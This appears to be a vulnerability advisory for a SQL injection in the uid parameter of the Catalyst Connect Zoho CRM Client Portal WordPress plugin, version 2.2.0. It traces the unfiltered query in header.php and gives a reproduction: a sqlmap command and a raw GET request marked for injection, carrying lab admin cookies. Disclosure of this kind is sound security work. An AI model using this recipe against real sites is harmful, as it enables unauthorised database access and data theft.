### The user query interface of the wordpress plugin **Catalyst Connect Zoho CRM Client Portal** has a sql injection vulnerability.

**Official website**: https://wordpress.org/plugins/catalyst-connect-client-portal/

**Version**：2.2.0

**Route**：/wp-admin/admin.php?page=usersmanagement&action=userdetails&uid=1

**API function**: search user records

**Injection parameters**: uid

**Request method**：GET

**Complete vulnerability trigger related interfaces and parameters**：/wp-admin/admin.php?page=usersmanagement&action=userdetails&uid=1

#### 1.Vulnerability analysis

In the header.php file under the pages/admin/usersManagement/details path in the project, you can see that the uid parameter is passed in through the get method and directly spliced into the SQL query statement to execute the query. There is no filtering, which will cause a SQL injection vulnerability

![image-20250312215743665](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250312215743665.png)

The header.php file will be called and executed in userdetails.php, and userdetails.php can be triggered by calling usersManagement.php, so a path can be constructed for SQL injection exploitation

![image-20250312220042579](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250312220042579.png)



#### 2.Vulnerability verification and exploitation

Vulnerability reproduction environment: wordpressV6.2.6

After installing the plug-in, you need to add a user information to verify the vulnerability.

You can use sqlmap to verify the vulnerability：python sqlmap.py -r 1.txt --batch --dbms=mysql

The specific injection data packets are as follows (need to replace nocache, security in the URL and cookies in the request header after logging in)

```
GET /wp-admin/admin.php?page=usersmanagement&action=userdetails&uid=1* HTTP/1.1
Host: wp6:84
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wordpress_fd878a606c7bb837fe398f83655e9949=admin%7C1742718907%7CTvj4Byozl1ZGVG3GNt4SydMG8k3Uc582JNbQFTybh10%7Cfbbc4c1c7856536bca6dcbcde4910c13559557071af69f132c39f51a812b3e33; PHPSESSID=2quv5qhdualkifntrt4shva7nd; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_fd878a606c7bb837fe398f83655e9949=admin%7C1742718907%7CTvj4Byozl1ZGVG3GNt4SydMG8k3Uc582JNbQFTybh10%7Ce37bdb2620a388e363b89dbe8674f7d050603ac7543f8721f9adc336ef7ff5d7; wp-settings-time-1=1741510287
Connection: close


```

![image-20250312220306046](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250312220306046.png)